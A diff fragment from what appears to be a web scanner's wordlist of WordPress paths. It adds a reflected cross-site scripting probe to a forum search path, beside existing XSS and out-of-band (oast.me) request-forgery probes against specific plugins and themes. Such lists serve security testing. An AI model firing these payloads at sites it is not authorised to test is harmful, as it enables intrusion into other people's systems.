@@ -118,3 +118,4 @@
 /wp-content/themes/ambience/thumb.php?src=%3Cbody%20onload%3Dalert(1)%3E.jpg
 /wp-content/plugins/gtranslate/url_addon/gtranslate.php?glang=en&gurl=/oast.me
 /wp-content/plugins/wpify-woo/deps/dragonbe/vies/examples/async_processing/queue.php/
+/forums/search/z-->%22%3e%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E/
